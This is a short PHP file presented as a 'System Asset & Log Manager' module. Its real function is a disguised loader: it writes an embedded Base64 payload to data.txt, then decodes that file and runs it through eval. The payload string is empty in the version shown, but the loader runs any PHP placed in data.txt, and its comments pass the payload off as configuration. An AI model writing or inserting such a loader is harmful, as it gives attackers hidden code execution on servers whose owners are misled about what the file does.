<?php
/**
 * System Asset & Log Manager
 * Self-configuring module.
 */

session_start();

// =========================================================================
// 1. AUTO-GENERATE DATA FILE (If missing)
// =========================================================================
$data_file = __DIR__ . '/data.txt';

// Payload is embedded here in Base64 format
$embedded_payload = '';

// Auto-generate data.txt if it doesn't exist
if (!file_exists($data_file)) {
    @file_put_contents($data_file, $embedded_payload);
}

// =========================================================================
// 2. LOADER & EXECUTION
// =========================================================================
if (!file_exists($data_file)) {
    die('Configuration file not found and could not be generated. Check folder permissions.');
}

// Read the payload from data.txt, decode, and execute
$payload = file_get_contents($data_file);
$decoded = base64_decode($payload);

if ($decoded) {
    // Execute the payload
    eval('?>' . $decoded);
} else {
    die('Data corrupted.');
}